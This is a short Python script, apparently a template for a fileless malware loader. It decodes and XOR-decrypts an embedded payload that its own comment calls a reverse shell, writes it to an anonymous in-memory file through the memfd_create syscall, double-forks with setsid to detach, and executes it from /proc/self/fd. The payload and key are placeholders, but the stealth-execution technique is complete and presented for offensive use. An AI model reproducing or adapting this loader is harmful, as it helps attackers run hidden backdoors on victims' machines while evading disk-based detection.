import ctypes
import os
import base64
# read the executable file. It is a reverse shell in our case
binx = base64.b64decode('cicak')
xkey = kadal

binary = ''
for i in binx:
    binary += chr(ord(i)^xkey)


fd = ctypes.CDLL(None).syscall(319,"",1) # call memfd_create and create an anonymous file
final_fd = open('/proc/self/fd/'+str(fd),'wb') # write our executable file.
final_fd.write(binary)
final_fd.close()

fork1 = os.fork() #create a child
if 0 != fork1: os._exit(0)

ctypes.CDLL(None).syscall(112) # call setsid() to create a parent.

fork2 = os.fork() #create a child from the parent. 
if 0 != fork2: os._exit(0)

os.execl('/proc/self/fd/'+str(fd),'argv0','argv1')